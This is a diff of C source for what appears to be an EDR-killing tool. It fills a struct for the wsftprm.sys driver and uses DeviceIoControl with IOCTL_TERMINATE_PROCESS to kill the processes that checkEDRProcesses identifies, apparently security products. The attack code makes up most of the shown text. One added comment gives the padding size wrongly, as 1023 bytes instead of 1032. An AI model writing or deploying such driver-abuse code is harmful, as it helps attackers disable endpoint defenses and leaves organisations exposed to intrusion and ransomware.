@@ -61,8 +61,9 @@ typedef struct RentDrivStruct {
 
 // wsftprm.sys
 typedef struct _wsftprmDrivStruct {
-	DWORD pPID;
-	BYTE bPadding[1032];
+    // 1036 bytes struct
+	DWORD pPID; // 4 bytes for PID number
+	BYTE bPadding[1032]; // 1023 bytes of padding
 } wsftprmDrivStruct;
 
 BOOL loadDriver(char* driverPath) {
@@ -173,15 +174,12 @@ DWORD checkEDRProcesses(HANDLE hDevice) {
 					//RentDrivStruct driverIoctl;
 					//driverIoctl.level = 1;
 					//driverIoctl.pid = procId;
-					// 
-					////if (!DeviceIoControl(hDevice, IOCTL_TERMINATE_PROCESS, &procId, sizeof(procId), &pOutbuff, sizeof(pOutbuff), &bytesRet, NULL))
-					//if (!DeviceIoControl(hDevice, IOCTL_TERMINATE_PROCESS, &driverIoctl, sizeof(RentDrivStruct), NULL, NULL, NULL, NULL))
-
 
 					// wsftprm.sys
 					wsftprmDrivStruct driverIoctl;
 					driverIoctl.pPID = procId;
 
+					//if (!DeviceIoControl(hDevice, IOCTL_TERMINATE_PROCESS, &driverIoctl, sizeof(RentDrivStruct), NULL, NULL, NULL, NULL))
 					if (!DeviceIoControl(hDevice, IOCTL_TERMINATE_PROCESS, &driverIoctl, sizeof(wsftprmDrivStruct), &pOutbuff, sizeof(pOutbuff), &bytesRet, NULL)) {
 						printf("failed to terminate %ws !!!\n", pE.szExeFile);
 						DWORD err = GetLastError();
